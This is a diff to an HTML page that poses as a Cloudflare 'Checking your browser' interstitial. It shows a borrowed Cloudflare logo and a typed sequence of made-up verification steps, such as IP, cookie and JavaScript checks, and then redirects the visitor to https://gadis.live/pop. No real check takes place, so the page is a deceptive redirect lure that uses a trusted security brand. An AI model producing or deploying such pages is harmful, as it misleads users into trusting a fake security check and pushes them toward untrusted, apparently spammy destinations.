@@ -3,12 +3,12 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Checking your browser...</title>
+  <title>Just a moment...</title>
   <style>
     body {
-      background: #121212;
-      color: #fff;
-      font-family: Arial, sans-serif;
+      background: #0d1117;
+      color: #c9d1d9;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       display: flex;
       flex-direction: column;
       justify-content: center;
@@ -17,34 +17,73 @@
       margin: 0;
       text-align: center;
     }
+    img {
+      width: 180px;
+      margin-bottom: 30px;
+      opacity: 0.8;
+    }
     .loader {
-      margin-top: 20px;
-      border: 8px solid #2c2c2c;
-      border-top: 8px solid #00e5ff;
+      border: 6px solid #161b22;
+      border-top: 6px solid #58a6ff;
       border-radius: 50%;
       width: 60px;
       height: 60px;
       animation: spin 1s linear infinite;
+      margin-top: 20px;
     }
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
-    .message {
-      font-size: 1.2rem;
-      margin-top: 20px;
-      color: #ccc;
+    #status {
+      margin-top: 30px;
+      font-size: 1.1rem;
+      opacity: 0.8;
+      min-height: 24px;
     }
   </style>
-  <script>
-    setTimeout(function() {
-      window.location.href = "https://gadis.live/pop";
-    }, 3000); // 3 detik
-  </script>
 </head>
 <body>
+  <img src="https://i.imgur.com/SQ8vqzv.png" alt="Cloudflare Logo" />
   <h2>Checking your browser before accessing</h2>
   <div class="loader"></div>
-  <div class="message">This process is automatic. Your browser will redirect shortly...</div>
+  <div id="status"></div>
+
+  <script>
+    const steps = [
+      "Checking browser environment...",
+      "Validating JavaScript engine...",
+      "Verifying IP address...",
+      "Checking cookies...",
+      "Finalizing security layer...",
+      "Redirecting..."
+    ];
+    
+    let i = 0;
+    let charIndex = 0;
+    const statusEl = document.getElementById("status");
+
+    function typeStep() {
+      if (i >= steps.length) {
+        window.location.href = "https://gadis.live/pop";
+        return;
+      }
+
+      if (charIndex < steps[i].length) {
+        statusEl.textContent += steps[i].charAt(charIndex);
+        charIndex++;
+        setTimeout(typeStep, 30);
+      } else {
+        i++;
+        charIndex = 0;
+        setTimeout(() => {
+          statusEl.textContent = '';
+          typeStep();
+        }, 700);
+      }
+    }
+
+    setTimeout(typeStep, 1000);
+  </script>
 </body>
 </html>
